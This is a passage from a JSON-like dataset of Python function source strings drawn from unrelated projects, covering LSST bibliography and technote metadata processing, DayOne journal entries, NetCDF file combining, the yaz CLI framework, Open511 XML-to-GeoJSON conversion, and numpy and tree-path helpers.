            "def get_bibliography(lsst_bib_names=None, bibtex=None):\n    \"\"\"Make a pybtex BibliographyData instance from standard lsst-texmf\n    bibliography files and user-supplied bibtex content.\n\n    Parameters\n    ----------\n    lsst_bib_names : sequence of `str`, optional\n        Names of lsst-texmf BibTeX files to include. For example:\n\n        .. code-block:: python\n\n           ['lsst', 'lsst-dm', 'refs', 'books', 'refs_ads']\n\n        Default is `None`, which includes all lsst-texmf bibtex files.\n\n    bibtex : `str`\n        BibTeX source content not included in lsst-texmf. This can be content\n        from a import ``local.bib`` file.\n\n    Returns\n    -------\n    bibliography : `pybtex.database.BibliographyData`\n        A pybtex bibliography database that includes all given sources:\n        lsst-texmf bibliographies and ``bibtex``.\n    \"\"\"\n    bibtex_data = get_lsst_bibtex(bibtex_filenames=lsst_bib_names)\n\n    # Parse with pybtex into BibliographyData instances\n    pybtex_data = [pybtex.database.parse_string(_bibtex, 'bibtex')\n                   for _bibtex in bibtex_data.values()]\n\n    # Also parse local bibtex content\n    if bibtex is not None:\n        pybtex_data.append(pybtex.database.parse_string(bibtex, 'bibtex'))\n\n    # Merge BibliographyData\n    bib = pybtex_data[0]\n    if len(pybtex_data) > 1:\n        for other_bib in pybtex_data[1:]:\n            for key, entry in other_bib.entries.items():\n                bib.add_entry(key, entry)\n\n    return bib"
        ],
        [
            "def get_url_from_entry(entry):\n    \"\"\"Get a usable URL from a pybtex entry.\n\n    Parameters\n    ----------\n    entry : `pybtex.database.Entry`\n        A pybtex bibliography entry.\n\n    Returns\n    -------\n    url : `str`\n        Best available URL from the ``entry``.\n\n    Raises\n    ------\n    NoEntryUrlError\n        Raised when no URL can be made from the bibliography entry.\n\n    Notes\n    -----\n    The order of priority is:\n\n    1. ``url`` field\n    2. ``ls.st`` URL from the handle for ``@docushare`` entries.\n    3. ``adsurl``\n    4. DOI\n    \"\"\"\n    if 'url' in entry.fields:\n        return entry.fields['url']\n    elif entry.type.lower() == 'docushare':\n        return 'https://ls.st/' + entry.fields['handle']\n    elif 'adsurl' in entry.fields:\n        return entry.fields['adsurl']\n    elif 'doi' in entry.fields:\n        return 'https://doi.org/' + entry.fields['doi']\n    else:\n        raise NoEntryUrlError()"
        ],
        [
            "def get_authoryear_from_entry(entry, paren=False):\n    \"\"\"Get and format author-year text from a pybtex entry to emulate\n    natbib citations.\n\n    Parameters\n    ----------\n    entry : `pybtex.database.Entry`\n        A pybtex bibliography entry.\n    parens : `bool`, optional\n        Whether to add parentheses around the year. Default is `False`.\n\n    Returns\n    -------\n    authoryear : `str`\n        The author-year citation text.\n    \"\"\"\n    def _format_last(person):\n        \"\"\"Reformat a pybtex Person into a last name.\n\n        Joins all parts of a last name and strips \"{}\" wrappers.\n        \"\"\"\n        return ' '.join([n.strip('{}') for n in person.last_names])\n\n    if len(entry.persons['author']) > 0:\n        # Grab author list\n        persons = entry.persons['author']\n    elif len(entry.persons['editor']) > 0:\n        # Grab editor list\n        persons = entry.persons['editor']\n    else:\n        raise AuthorYearError\n\n    try:\n        year = entry.fields['year']\n    except KeyError:\n        raise AuthorYearError\n\n    if paren and len(persons) == 1:\n        template = '{author} ({year})'\n        return template.format(author=_format_last(persons[0]),\n                               year=year)\n    elif not paren and len(persons) == 1:\n        template = '{author} {year}'\n        return template.format(author=_format_last(persons[0]),\n                               year=year)\n    elif paren and len(persons) == 2:\n        template = '{author1} and {author2} ({year})'\n        return template.format(author1=_format_last(persons[0]),\n                               author2=_format_last(persons[1]),\n                               year=year)\n    elif not paren and len(persons) == 2:\n        template = '{author1} and {author2} {year}'\n        return template.format(author1=_format_last(persons[0]),\n                               author2=_format_last(persons[1]),\n                               year=year)\n    elif not paren and len(persons) > 2:\n        template = '{author} et al {year}'\n        return template.format(author=_format_last(persons[0]),\n                               year=year)\n    elif paren and len(persons) > 2:\n        template = '{author} et al ({year})'\n        return template.format(author=_format_last(persons[0]),\n                               year=year)"
        ],
        [
            "async def process_sphinx_technote(session, github_api_token, ltd_product_data,\n                                  mongo_collection=None):\n    \"\"\"Extract, transform, and load Sphinx-based technote metadata.\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    ltd_product_data : `dict`\n        Contents of ``metadata.yaml``, obtained via `download_metadata_yaml`.\n        Data for this technote from the LTD Keeper API\n        (``GET /products/<slug>``). Usually obtained via\n        `lsstprojectmeta.ltd.get_ltd_product`.\n    mongo_collection : `motor.motor_asyncio.AsyncIOMotorCollection`, optional\n        MongoDB collection. This should be the common MongoDB collection for\n        LSST projectmeta JSON-LD records. If provided, ths JSON-LD is upserted\n        into the MongoDB collection.\n\n    Returns\n    -------\n    metadata : `dict`\n        JSON-LD-formatted dictionary.\n\n    Raises\n    ------\n    NotSphinxTechnoteError\n        Raised when the LTD product cannot be interpreted as a Sphinx-based\n        technote project because it's missing a metadata.yaml file in its\n        GitHub repository. This implies that the LTD product *could* be of a\n        different format.\n\n    .. `GitHub personal access token guide`: https://ls.st/41d\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    github_url = ltd_product_data['doc_repo']\n    github_url = normalize_repo_root_url(github_url)\n    repo_slug = parse_repo_slug_from_url(github_url)\n\n    try:\n        metadata_yaml = await download_metadata_yaml(session, github_url)\n    except aiohttp.ClientResponseError as err:\n        # metadata.yaml not found; probably not a Sphinx technote\n        logger.debug('Tried to download %s\\'s metadata.yaml, got status %d',\n                     ltd_product_data['slug'], err.code)\n        raise NotSphinxTechnoteError()\n\n    # Extract data from the GitHub API\n    github_query = GitHubQuery.load('technote_repo')\n    github_variables = {\n        \"orgName\": repo_slug.owner,\n        \"repoName\": repo_slug.repo\n    }\n    github_data = await github_request(session, github_api_token,\n                                       query=github_query,\n                                       variables=github_variables)\n\n    try:\n        jsonld = reduce_technote_metadata(\n            github_url, metadata_yaml, github_data, ltd_product_data)\n    except Exception as exception:\n        message = \"Issue building JSON-LD for technote %s\"\n        logger.exception(message, github_url, exception)\n        raise\n\n    if mongo_collection is not None:\n        await _upload_to_mongodb(mongo_collection, jsonld)\n\n    logger.info('Ingested technote %s into MongoDB', github_url)\n\n    return jsonld"
        ],
        [
            "def reduce_technote_metadata(github_url, metadata, github_data,\n                             ltd_product_data):\n    \"\"\"Reduce a technote project's metadata from multiple sources into a\n    single JSON-LD resource.\n\n    Parameters\n    ----------\n    github_url : `str`\n        URL of the technote's GitHub repository.\n    metadata : `dict`\n        The parsed contents of ``metadata.yaml`` found in a technote's\n        repository.\n    github_data : `dict`\n        The contents of the ``technote_repo`` GitHub GraphQL API query.\n    ltd_product_data : `dict`\n        JSON dataset for the technote corresponding to the\n        ``/products/<product>`` of LTD Keeper.\n\n    Returns\n    -------\n    metadata : `dict`\n        JSON-LD-formatted dictionary.\n\n    .. `GitHub personal access token guide`: https://ls.st/41d\n    \"\"\"\n    repo_slug = parse_repo_slug_from_url(github_url)\n\n    # Initialize a schema.org/Report and schema.org/SoftwareSourceCode\n    # linked data resource\n    jsonld = {\n        '@context': [\n            \"https://raw.githubusercontent.com/codemeta/codemeta/2.0-rc/\"\n            \"codemeta.jsonld\",\n            \"http://schema.org\"],\n        '@type': ['Report', 'SoftwareSourceCode'],\n        'codeRepository': github_url\n    }\n\n    if 'url' in metadata:\n        url = metadata['url']\n    elif 'published_url' in ltd_product_data:\n        url = ltd_product_data['published_url']\n    else:\n        raise RuntimeError('No identifying url could be found: '\n                           '{}'.format(github_url))\n    jsonld['@id'] = url\n    jsonld['url'] = url\n\n    if 'series' in metadata and 'serial_number' in metadata:\n        jsonld['reportNumber'] = '{series}-{serial_number}'.format(**metadata)\n    else:\n        raise RuntimeError('No reportNumber: {}'.format(github_url))\n\n    if 'doc_title' in metadata:\n        jsonld['name'] = metadata['doc_title']\n\n    if 'description' in metadata:\n        jsonld['description'] = metadata['description']\n\n    if 'authors' in metadata:\n        jsonld['author'] = [{'@type': 'Person', 'name': author_name}\n                            for author_name in metadata['authors']]\n\n    if 'last_revised' in metadata:\n        # Prefer getting the 'last_revised' date from metadata.yaml\n        # since it's considered an override.\n        jsonld['dateModified'] = datetime.datetime.strptime(\n            metadata['last_revised'],\n            '%Y-%m-%d')\n    else:\n        # Fallback to parsing the date of the last commit to the\n        # default branch on GitHub (usually `master`).\n        try:\n            _repo_data = github_data['data']['repository']\n            _master_data = _repo_data['defaultBranchRef']\n            jsonld['dateModified'] = datetime.datetime.strptime(\n                _master_data['target']['committedDate'],\n                '%Y-%m-%dT%H:%M:%SZ')\n        except KeyError:\n            pass\n\n    try:\n        _license_data = github_data['data']['repository']['licenseInfo']\n        _spdxId = _license_data['spdxId']\n        if _spdxId is not None:\n            _spdx_url = 'https://spdx.org/licenses/{}.html'.format(_spdxId)\n            jsonld['license'] = _spdx_url\n    except KeyError:\n        pass\n\n    try:\n        # Find the README(|.md|.rst|*) file in the repo root\n        _master_data = github_data['data']['repository']['defaultBranchRef']\n        _files = _master_data['target']['tree']['entries']\n        for _node in _files:\n            filename = _node['name']\n            normalized_filename = filename.lower()\n            if normalized_filename.startswith('readme'):\n                readme_url = make_raw_content_url(repo_slug, 'master',\n                                                  filename)\n                jsonld['readme'] = readme_url\n                break\n    except KeyError:\n        pass\n\n    # Assume Travis is the CI service (always true at the moment)\n    travis_url = 'https://travis-ci.org/{}'.format(repo_slug.full)\n    jsonld['contIntegration'] = travis_url\n\n    return jsonld"
        ],
        [
            "async def download_metadata_yaml(session, github_url):\n    \"\"\"Download the metadata.yaml file from a technote's GitHub repository.\n    \"\"\"\n    metadata_yaml_url = _build_metadata_yaml_url(github_url)\n    async with session.get(metadata_yaml_url) as response:\n        response.raise_for_status()\n        yaml_data = await response.text()\n    return yaml.safe_load(yaml_data)"
        ],
        [
            "def tz(self):\n        \"\"\"Return the timezone. If none is set use system timezone\"\"\"\n        if not self._tz:\n            self._tz = tzlocal.get_localzone().zone\n        return self._tz"
        ],
        [
            "def time(self, t):\n        \"\"\"Convert any timestamp into a datetime and save as _time\"\"\"\n        _time = arrow.get(t).format('YYYY-MM-DDTHH:mm:ss')\n        self._time = datetime.datetime.strptime(_time, '%Y-%m-%dT%H:%M:%S')"
        ],
        [
            "def as_dict(self):\n        \"\"\"Return a dict that represents the DayOneEntry\"\"\"\n        entry_dict = {}\n        entry_dict['UUID'] = self.uuid\n        entry_dict['Creation Date'] = self.time\n        entry_dict['Time Zone'] = self.tz\n        if self.tags:\n            entry_dict['Tags'] = self.tags\n        entry_dict['Entry Text'] = self.text\n        entry_dict['Starred'] = self.starred\n        entry_dict['Location'] = self.location\n        return entry_dict"
        ],
        [
            "def save(self, entry, with_location=True, debug=False):\n        \"\"\"Saves a DayOneEntry as a plist\"\"\"\n        entry_dict = {}\n        if isinstance(entry, DayOneEntry):\n            # Get a dict of the DayOneEntry\n            entry_dict = entry.as_dict()\n        else:\n            entry_dict = entry\n        \n        # Set the UUID\n        entry_dict['UUID'] = uuid.uuid4().get_hex()\n        if with_location and not entry_dict['Location']:\n            entry_dict['Location'] = self.get_location()\n\n\n        # Do we have everything needed?\n        if not all ((entry_dict['UUID'], entry_dict['Time Zone'],\n                     entry_dict['Entry Text'])):\n            print \"You must provide: Time zone, UUID, Creation Date, Entry Text\"\n            return False\n\n        if debug is False:\n            file_path = self._file_path(entry_dict['UUID'])\n            plistlib.writePlist(entry_dict, file_path)\n        else:\n            plist = plistlib.writePlistToString(entry_dict)\n            print plist\n\n        return True"
        ],
        [
            "def _file_path(self, uid):\n        \"\"\"Create and return full file path for DayOne entry\"\"\"\n        file_name = '%s.doentry' % (uid)\n        return os.path.join(self.dayone_journal_path, file_name)"
        ],
        [
            "def combine(self, members, output_file, dimension=None, start_index=None, stop_index=None, stride=None):\n        \"\"\" Combine many files into a single file on disk.  Defaults to using the 'time' dimension. \"\"\"\n        nco = None\n        try:\n            nco = Nco()\n        except BaseException:\n            # This is not necessarily an import error (could be wrong PATH)\n            raise ImportError(\"NCO not found.  The NCO python bindings are required to use 'Collection.combine'.\")\n\n        if len(members) > 0 and hasattr(members[0], 'path'):\n            # A member DotDoct was passed in, we only need the paths\n            members = [ m.path for m in members ]\n\n        options  = ['-4']  # NetCDF4\n        options += ['-L', '3']  # Level 3 compression\n        options += ['-h']  # Don't append to the history global attribute\n        if dimension is not None:\n            if start_index is None:\n                start_index = 0\n            if stop_index is None:\n                stop_index = ''\n            if stride is None:\n                stride = 1\n            options += ['-d', '{0},{1},{2},{3}'.format(dimension, start_index, stop_index, stride)]\n        nco.ncrcat(input=members, output=output_file, options=options)"
        ],
        [
            "def main(argv=None, white_list=None, load_yaz_extension=True):\n    \"\"\"The entry point for a yaz script\n\n    This will almost always be called from a python script in\n    the following manner:\n\n        if __name__ == \"__main__\":\n            yaz.main()\n\n    This function will perform the following steps:\n\n    1. It will load any additional python code from\n       the yaz_extension python module located in the\n       ~/.yaz directory when LOAD_YAZ_EXTENSION is True\n       and the yaz_extension module exists\n\n    2. It collects all yaz tasks and plugins.  When WHITE_LIST\n       is a non-empty list, only the tasks and plugins located\n       therein will be considered\n\n    3. It will parse arguments from ARGV, or the command line\n       when ARGV is not given, resulting in a yaz task or a parser\n       help message.\n\n    4. When a suitable task is found, this task is executed.  In\n       case of a task which is part of a plugin, i.e. class, then\n       this plugin is initialized, possibly resulting in other\n       plugins to also be initialized if there are marked as\n       `@yaz.dependency`.\n    \"\"\"\n    assert argv is None or isinstance(argv, list), type(argv)\n    assert white_list is None or isinstance(white_list, list), type(white_list)\n    assert isinstance(load_yaz_extension, bool), type(load_yaz_extension)\n\n    argv = sys.argv if argv is None else argv\n    assert len(argv) > 0, len(argv)\n\n    if load_yaz_extension:\n        load(\"~/.yaz\", \"yaz_extension\")\n\n    parser = Parser(prog=argv[0])\n    parser.add_task_tree(get_task_tree(white_list))\n\n    task, kwargs = parser.parse_arguments(argv)\n\n    if task:\n        try:\n            result = task(**kwargs)\n\n            # when the result is a boolean, exit with 0 (success) or 1 (failure)\n            if isinstance(result, bool):\n                code = 0 if result else 1\n                output = None\n\n            # when the result is an integer, exit with that integer value\n            elif isinstance(result, int):\n                code = result % 256\n                output = None\n\n            # otherwise exit with 0 (success) and print the result\n            else:\n                code = 0\n                output = result\n\n        # when yaz.Error occurs, exit with the given return code and print the error message\n        # when any other error occurs, let python handle the exception (i.e. exit(1) and print call stack)\n        except Error as error:\n            code = error.return_code\n            output = error\n\n    else:\n        # when no task is found to execute, exit with 1 (failure) and print the help text\n        code = 1\n        output = parser.format_help().rstrip()\n\n    if output is not None:\n        print(output)\n\n    sys.exit(code)"
        ],
        [
            "def get_task_tree(white_list=None):\n    \"\"\"Returns a tree of Task instances\n\n    The tree is comprised of dictionaries containing strings for\n    keys and either dictionaries or Task instances for values.\n\n    When WHITE_LIST is given, only the tasks and plugins in this\n    list will become part of the task tree.  The WHITE_LIST may\n    contain either strings, corresponding to the task of plugin\n    __qualname__, or, preferable, the WHITE_LIST contains\n    links to the task function or plugin class instead.\n    \"\"\"\n    assert white_list is None or isinstance(white_list, list), type(white_list)\n\n    if white_list is not None:\n        white_list = set(item if isinstance(item, str) else item.__qualname__ for item in white_list)\n\n    tree = dict((task.qualified_name, task)\n                for task\n                in _task_list.values()\n                if white_list is None or task.qualified_name in white_list)\n\n    plugins = get_plugin_list()\n    for plugin in [plugin for plugin in plugins.values() if white_list is None or plugin.__qualname__ in white_list]:\n        tasks = [func\n                 for _, func\n                 in inspect.getmembers(plugin)\n                 if inspect.isfunction(func) and hasattr(func, \"yaz_task_config\")]\n        if len(tasks) == 0:\n            continue\n\n        node = tree\n        for name in plugin.__qualname__.split(\".\"):\n            if not name in node:\n                node[name] = {}\n            node = node[name]\n\n        for func in tasks:\n            logger.debug(\"Found task %s\", func)\n            node[func.__name__] = Task(plugin_class=plugin, func=func, config=func.yaz_task_config)\n\n    return tree"
        ],
        [
            "def task(func, **config):\n    \"\"\"Declare a function or method to be a Yaz task\n\n    @yaz.task\n    def talk(message: str = \"Hello World!\"):\n        return message\n\n    Or... group multiple tasks together\n\n    class Tools(yaz.Plugin):\n        @yaz.task\n        def say(self, message: str = \"Hello World!\"):\n            return message\n\n        @yaz.task(option__choices=[\"A\", \"B\", \"C\"])\n        def choose(self, option: str = \"A\"):\n            return option\n    \"\"\"\n    if func.__name__ == func.__qualname__:\n        assert not func.__qualname__ in _task_list, \"Can not define the same task \\\"{}\\\" twice\".format(func.__qualname__)\n        logger.debug(\"Found task %s\", func)\n        _task_list[func.__qualname__] = Task(plugin_class=None, func=func, config=config)\n    else:\n        func.yaz_task_config = config\n\n    return func"
        ],
        [
            "def get_parameters(self):\n        \"\"\"Returns a list of parameters\"\"\"\n        if self.plugin_class is None:\n            sig = inspect.signature(self.func)\n            for index, parameter in enumerate(sig.parameters.values()):\n                if not parameter.kind in [parameter.POSITIONAL_ONLY, parameter.KEYWORD_ONLY, parameter.POSITIONAL_OR_KEYWORD]:\n                    raise RuntimeError(\"Task {} contains an unsupported {} parameter\".format(parameter, parameter.kind))\n\n                yield parameter\n\n        else:\n            var_keyword_seen = set()\n\n            for cls in inspect.getmro(self.plugin_class):\n                if issubclass(cls, BasePlugin) and hasattr(cls, self.func.__name__):\n                    func = getattr(cls, self.func.__name__)\n                    logger.debug(\"Found method %s from class %s\", func, cls)\n                    var_keyword_found = False\n                    sig = inspect.signature(func)\n                    for index, parameter in enumerate(sig.parameters.values()):\n                        if index == 0:\n                            # skip \"self\" parameter\n                            continue\n\n                        if parameter.kind == inspect.Parameter.VAR_KEYWORD:\n                            # found \"**kwargs\" parameter.  we will continue to the next class in the mro\n                            # to add any keyword parameters we have not yet used (i.e. whose name\n                            # we have not yet seen)\n                            var_keyword_found = True\n                            continue\n\n                        if parameter.kind in [parameter.POSITIONAL_ONLY, parameter.VAR_POSITIONAL]:\n                            raise RuntimeError(\"Task {} contains an unsupported parameter \\\"{}\\\"\".format(func, parameter))\n\n                        if not parameter.name in var_keyword_seen:\n                            var_keyword_seen.add(parameter.name)\n\n                            logger.debug(\"Found parameter %s (%s)\", parameter, parameter.kind)\n                            yield parameter\n\n                    # we only need to look at the next class in the mro\n                    # when \"**kwargs\" is found\n                    if not var_keyword_found:\n                        break"
        ],
        [
            "def get_configuration(self, key, default=None):\n        \"\"\"Returns the configuration for KEY\"\"\"\n        if key in self.config:\n            return self.config.get(key)\n        else:\n            return default"
        ],
        [
            "def get_plugin_instance(plugin_class, *args, **kwargs):\n    \"\"\"Returns an instance of a fully initialized plugin class\n\n    Every plugin class is kept in a plugin cache, effectively making\n    every plugin into a singleton object.\n\n    When a plugin has a yaz.dependency decorator, it will be called\n    as well, before the instance is returned.\n    \"\"\"\n    assert issubclass(plugin_class, BasePlugin), type(plugin_class)\n\n    global _yaz_plugin_instance_cache\n\n    qualname = plugin_class.__qualname__\n    if not qualname in _yaz_plugin_instance_cache:\n        plugin_class = get_plugin_list()[qualname]\n        _yaz_plugin_instance_cache[qualname] = plugin = plugin_class(*args, **kwargs)\n\n        # find any yaz.dependency decorators, and call them when necessary\n        funcs = [func\n                 for _, func\n                 in inspect.getmembers(plugin)\n                 if inspect.ismethod(func) and hasattr(func, \"yaz_dependency_config\")]\n\n        for func in funcs:\n            signature = inspect.signature(func)\n            assert all(parameter.kind is parameter.POSITIONAL_OR_KEYWORD and issubclass(parameter.annotation, BasePlugin) for parameter in signature.parameters.values()), \"All parameters for {} must type hint to a BasePlugin\".format(func)\n            func(*[get_plugin_instance(parameter.annotation)\n                   for parameter\n                   in signature.parameters.values()])\n\n    return _yaz_plugin_instance_cache[qualname]"
        ],
        [
            "def xml_to_json(root):\n    \"\"\"Convert an Open511 XML document or document fragment to JSON.\n\n    Takes an lxml Element object. Returns a dict ready to be JSON-serialized.\"\"\"\n    j = {}\n\n    if len(root) == 0:  # Tag with no children, return str/int\n        return _maybe_intify(root.text)\n\n    if len(root) == 1 and root[0].tag.startswith('{' + NS_GML):  # GML\n        return gml_to_geojson(root[0])\n\n    if root.tag == 'open511':\n        j['meta'] = {'version': root.get('version')}\n\n    for elem in root:\n        name = elem.tag\n        if name == 'link' and elem.get('rel'):\n            name = elem.get('rel') + '_url'\n            if name == 'self_url':\n                name = 'url'\n            if root.tag == 'open511':\n                j['meta'][name] = elem.get('href')\n                continue\n        elif name.startswith('{' + NS_PROTECTED):\n            name = '!' + name[name.index('}') + 1:] \n        elif name[0] == '{':\n            # Namespace!\n            name = '+' + name[name.index('}') + 1:]\n\n        if name in j:\n            continue  # duplicate\n        elif elem.tag == 'link' and not elem.text:\n            j[name] = elem.get('href')\n        elif len(elem):\n            if name == 'grouped_events':\n                # An array of URLs\n                j[name] = [xml_link_to_json(child, to_dict=False) for child in elem]\n            elif name in ('attachments', 'media_files'):\n                # An array of JSON objects\n                j[name] = [xml_link_to_json(child, to_dict=True) for child in elem]\n            elif all((name == pluralize(child.tag) for child in elem)):\n                # <something><somethings> serializes to a JSON array\n                j[name] = [xml_to_json(child) for child in elem]\n            else:\n                j[name] = xml_to_json(elem)\n        else:\n            if root.tag == 'open511' and name.endswith('s') and not elem.text:\n                # Special case: an empty e.g. <events /> container at the root level\n                # should be serialized to [], not null\n                j[name] = []\n            else:\n                j[name] = _maybe_intify(elem.text)\n\n    return j"
        ],
        [
            "def gml_to_geojson(el):\n    \"\"\"Given an lxml Element of a GML geometry, returns a dict in GeoJSON format.\"\"\"\n    if el.get('srsName') not in ('urn:ogc:def:crs:EPSG::4326', None):\n        if el.get('srsName') == 'EPSG:4326':\n            return _gmlv2_to_geojson(el)\n        else:\n            raise NotImplementedError(\"Unrecognized srsName %s\" % el.get('srsName'))\n    tag = el.tag.replace('{%s}' % NS_GML, '')\n    if tag == 'Point':\n        coordinates = _reverse_gml_coords(el.findtext('{%s}pos' % NS_GML))[0]\n    elif tag == 'LineString':\n        coordinates = _reverse_gml_coords(el.findtext('{%s}posList' % NS_GML))\n    elif tag == 'Polygon':\n        coordinates = []\n        for ring in el.xpath('gml:exterior/gml:LinearRing/gml:posList', namespaces=NSMAP) \\\n                + el.xpath('gml:interior/gml:LinearRing/gml:posList', namespaces=NSMAP):\n            coordinates.append(_reverse_gml_coords(ring.text))\n    elif tag in ('MultiPoint', 'MultiLineString', 'MultiPolygon'):\n        single_type = tag[5:]\n        member_tag = single_type[0].lower() + single_type[1:] + 'Member'\n        coordinates = [\n            gml_to_geojson(member)['coordinates']\n            for member in el.xpath('gml:%s/gml:%s' % (member_tag, single_type), namespaces=NSMAP)\n        ]\n    else:\n        raise NotImplementedError\n\n    return {\n        'type': tag,\n        'coordinates': coordinates\n    }"
        ],
        [
            "def _gmlv2_to_geojson(el):\n    \"\"\"Translates a deprecated GML 2.0 geometry to GeoJSON\"\"\"\n    tag = el.tag.replace('{%s}' % NS_GML, '')\n    if tag == 'Point':\n        coordinates = [float(c) for c in el.findtext('{%s}coordinates' % NS_GML).split(',')]\n    elif tag == 'LineString':\n        coordinates = [\n            [float(x) for x in pair.split(',')]\n            for pair in el.findtext('{%s}coordinates' % NS_GML).split(' ')\n        ]\n    elif tag == 'Polygon':\n        coordinates = []\n        for ring in el.xpath('gml:outerBoundaryIs/gml:LinearRing/gml:coordinates', namespaces=NSMAP) \\\n                + el.xpath('gml:innerBoundaryIs/gml:LinearRing/gml:coordinates', namespaces=NSMAP):\n            coordinates.append([\n                [float(x) for x in pair.split(',')]\n                for pair in ring.text.split(' ')\n            ])\n    elif tag in ('MultiPoint', 'MultiLineString', 'MultiPolygon', 'MultiCurve'):\n        if tag == 'MultiCurve':\n            single_type = 'LineString'\n            member_tag = 'curveMember'\n        else:\n            single_type = tag[5:]\n            member_tag = single_type[0].lower() + single_type[1:] + 'Member'\n        coordinates = [\n            gml_to_geojson(member)['coordinates']\n            for member in el.xpath('gml:%s/gml:%s' % (member_tag, single_type), namespaces=NSMAP)\n        ]\n    else:\n        raise NotImplementedError\n\n    return {\n        'type': tag,\n        'coordinates': coordinates\n    }"
        ],
        [
            "def deparagraph(element, doc):\n    \"\"\"Panflute filter function that converts content wrapped in a Para to\n    Plain.\n\n    Use this filter with pandoc as::\n\n        pandoc [..] --filter=lsstprojectmeta-deparagraph\n\n    Only lone paragraphs are affected. Para elements with siblings (like a\n    second Para) are left unaffected.\n\n    This filter is useful for processing strings like titles or author names so\n    that the output isn't wrapped in paragraph tags. For example, without\n    this filter, pandoc converts a string ``\"The title\"`` to\n    ``<p>The title</p>`` in HTML. These ``<p>`` tags aren't useful if you\n    intend to put the title text in ``<h1>`` tags using your own templating\n    system.\n    \"\"\"\n    if isinstance(element, Para):\n        # Check if siblings exist; don't process the paragraph in that case.\n        if element.next is not None:\n            return element\n        elif element.prev is not None:\n            return element\n\n        # Remove the Para wrapper from the lone paragraph.\n        # `Plain` is a container that isn't rendered as a paragraph.\n        return Plain(*element.content)"
        ],
        [
            "def all_subclasses(cls):\n    \"\"\" Recursively generate of all the subclasses of class cls. \"\"\"\n    for subclass in cls.__subclasses__():\n        yield subclass\n        for subc in all_subclasses(subclass):\n            yield subc"
        ],
        [
            "def unique_justseen(iterable, key=None):\n    \"List unique elements, preserving order. Remember only the element just seen.\"\n    # unique_justseen('AAAABBBCCDAABBB') --> A B C D A B\n    # unique_justseen('ABBCcAD', str.lower) --> A B C A D\n    try:\n        # PY2 support\n        from itertools import imap as map\n    except ImportError:\n        from builtins import map\n\n    return map(next, map(operator.itemgetter(1), itertools.groupby(iterable, key)))"
        ],
        [
            "def generic_masked(arr, attrs=None, minv=None, maxv=None, mask_nan=True):\n    \"\"\"\n    Returns a masked array with anything outside of values masked.\n    The minv and maxv parameters take precendence over any dict values.\n    The valid_range attribute takes precendence over the valid_min and\n    valid_max attributes.\n    \"\"\"\n    attrs = attrs or {}\n\n    if 'valid_min' in attrs:\n        minv = safe_attribute_typing(arr.dtype, attrs['valid_min'])\n    if 'valid_max' in attrs:\n        maxv = safe_attribute_typing(arr.dtype, attrs['valid_max'])\n    if 'valid_range' in attrs:\n        vr = attrs['valid_range']\n        minv = safe_attribute_typing(arr.dtype, vr[0])\n        maxv = safe_attribute_typing(arr.dtype, vr[1])\n\n    # Get the min/max of values that the hardware supports\n    try:\n        info = np.iinfo(arr.dtype)\n    except ValueError:\n        info = np.finfo(arr.dtype)\n\n    minv = minv if minv is not None else info.min\n    maxv = maxv if maxv is not None else info.max\n\n    if mask_nan is True:\n        arr = np.ma.fix_invalid(arr)\n\n    return np.ma.masked_outside(\n        arr,\n        minv,\n        maxv\n    )"
        ],
        [
            "def default(self, obj):\n        \"\"\"If input object is an ndarray it will be converted into a list\n        \"\"\"\n        if isinstance(obj, np.ndarray):\n            return obj.tolist()\n        elif isinstance(obj, np.generic):\n            return np.asscalar(obj)\n        # Let the base class default method raise the TypeError\n        return json.JSONEncoder(self, obj)"
        ],
        [
            "def default(self, obj):\n        \"\"\"If input object is an ndarray it will be converted into a dict\n        holding dtype, shape and the data, base64 encoded.\n        \"\"\"\n        if isinstance(obj, np.ndarray):\n            if obj.flags['C_CONTIGUOUS']:\n                obj_data = obj.data\n            else:\n                cont_obj = np.ascontiguousarray(obj)\n                assert(cont_obj.flags['C_CONTIGUOUS'])\n                obj_data = cont_obj.data\n            data_b64 = base64.b64encode(obj_data)\n            return dict(__ndarray__=data_b64,\n                        dtype=str(obj.dtype),\n                        shape=obj.shape)\n        elif isinstance(obj, np.generic):\n            return np.asscalar(obj)\n        # Let the base class default method raise the TypeError\n        return json.JSONEncoder(self, obj)"
        ],
        [
            "def update_desc_lsib_path(desc):\n    '''\n        leftSibling\n        previousSibling\n        leftSib\n        prevSib\n        lsib\n        psib\n        \n        have the same parent,and on the left\n    '''\n    if(desc['sib_seq']>0):\n        lsib_path = copy.deepcopy(desc['path'])\n        lsib_path[-1] = desc['sib_seq']-1\n        desc['lsib_path'] = lsib_path\n    else:\n        pass\n    return(desc)"
        ],
        [
            "def update_desc_rsib_path(desc,sibs_len):\n    '''\n        rightSibling\n        nextSibling\n        rightSib\n        nextSib\n        rsib\n        nsib\n        \n        have the same parent,and on the right\n    '''\n    if(desc['sib_seq']<(sibs_len-1)):\n        rsib_path = copy.deepcopy(desc['path'])\n        rsib_path[-1] = desc['sib_seq']+1\n        desc['rsib_path'] = rsib_path\n    else:\n        pass\n    return(desc)"
        ],
        [
            "def update_desc_lcin_path(desc,pdesc_level):\n    '''\n        leftCousin\n        previousCousin\n        leftCin\n        prevCin\n        lcin\n        pcin\n        \n        parents are neighbors,and on the left\n    '''\n    parent_breadth = desc['parent_breadth_path'][-1]\n    if(desc['sib_seq']==0):\n        if(parent_breadth==0):\n            pass\n        else:\n            parent_lsib_breadth = parent_breadth - 1\n            plsib_desc = pdesc_level[parent_lsib_breadth]\n            if(plsib_desc['leaf']):\n                pass\n            else:\n                lcin_path = copy.deepcopy(plsib_desc['path'])\n                lcin_path.append(plsib_desc['sons_count'] - 1)\n                desc['lcin_path'] = lcin_path\n    else:\n        pass\n    return(desc)"
        ],
        [
